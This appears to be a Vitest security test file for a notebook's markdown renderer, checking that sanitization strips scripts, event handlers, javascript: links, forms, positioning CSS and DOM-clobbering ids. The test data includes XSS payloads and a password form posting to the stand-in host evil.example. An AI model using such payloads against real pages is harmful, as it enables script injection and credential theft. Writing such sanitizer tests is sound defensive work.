// @vitest-environment jsdom
import { describe, it, expect } from 'vitest';
import { renderMarkdown, escapeHtmlFallback } from '../../src/ui/nb-view/renderers/markdown';

describe('Markdown & HTML Output Security (DOMPurify Sanitization)', () => {
  it('strips <script> tags and executes no code', async () => {
    const malicious = '# Hello\n<script>window.hacked = true;</script>\nSafe text';
    const html = await renderMarkdown(malicious);

    expect(html).not.toContain('<script>');
    expect(html).not.toContain('window.hacked');
    expect(html).toContain('Safe text');
  });

  it('strips inline onerror / onload event handlers from images and svgs', async () => {
    const payload =
      '<img src="invalid.jpg" onerror="alert(1)" alt="test" />\n<svg onload="alert(2)"></svg>';
    const html = await renderMarkdown(payload);

    expect(html).not.toContain('onerror');
    expect(html).not.toContain('onload');
    expect(html).not.toContain('alert(1)');
    expect(html).not.toContain('alert(2)');
  });

  it('neutralizes javascript: URLs in anchor tags', async () => {
    const payload = '[Dangerous Link](javascript:alert("pwned"))';
    const html = await renderMarkdown(payload);

    expect(html).not.toContain('href="javascript:');
  });

  it('resolves attachment:<name> to data: URL from cell attachments', async () => {
    const source = '![my plot](attachment:plot.png)';
    const attachments = {
      'plot.png': {
        'image/png':
          'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg=='
      }
    };

    const html = await renderMarkdown(source, attachments);
    expect(html).toContain(
      'src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg=="'
    );
  });

  it('handles KaTeX math expressions safely without code injection', async () => {
    const mathSource = 'The equation is $E = mc^2$ and $$\\int_0^\\infty e^{-x} dx = 1$$';
    const html = await renderMarkdown(mathSource);

    expect(html).toContain('katex');
    expect(html).toContain('math');
  });

  it('removes forms and form controls', async () => {
    const html = await renderMarkdown(
      '<form action="https://evil.example/c"><input type="password" name="p"><button>Go</button></form>'
    );
    expect(html).not.toMatch(/<form|<input|<button/);
  });

  it('strips fixed/absolute/sticky positioning, including CSS escapes', async () => {
    for (const s of [
      'position:fixed',
      'position: absolute',
      'posit\\69on:fixed',
      'position:sticky'
    ]) {
      const html = await renderMarkdown(`<div style="${s};inset:0">x</div>`);
      expect(html).not.toMatch(/fixed|absolute|sticky/);
    }
  });

  it('keeps relative positioning and KaTeX inline styles', async () => {
    const html = await renderMarkdown(
      '$$\\frac{a}{b}$$\n\n<span style="position:relative;top:1px">r</span>'
    );
    expect(html).toContain('class="katex');
    expect(html).toMatch(/style="[^"]*vertical-align/);
    expect(html).toMatch(/position:\s*relative/);
  });

  it('drops <style> elements', async () => {
    expect(await renderMarkdown('<style>body{display:none}</style>ok')).not.toContain('<style');
  });

  it('opens external links in a new tab safely, leaves anchors alone', async () => {
    const ext = await renderMarkdown('[d](https://example.com)');
    expect(ext).toContain('target="_blank"');
    expect(ext).toContain('rel="noopener noreferrer"');
    const anchor = await renderMarkdown('[s](#section)');
    expect(anchor).not.toContain('target=');
  });

  it('namespaces id/name to prevent DOM clobbering', async () => {
    const html = await renderMarkdown(
      '<img id="app" name="settings" src="data:image/png;base64,AA==">'
    );
    expect(html).toContain('id="user-content-app"');
    expect(html).not.toMatch(/\bid="app"/);
  });

  it('fails closed: escapes html when no sanitizer is available', () => {
    expect(escapeHtmlFallback('<b onclick=x>t</b>')).toBe('&lt;b onclick=x&gt;t&lt;/b&gt;');
  });
});
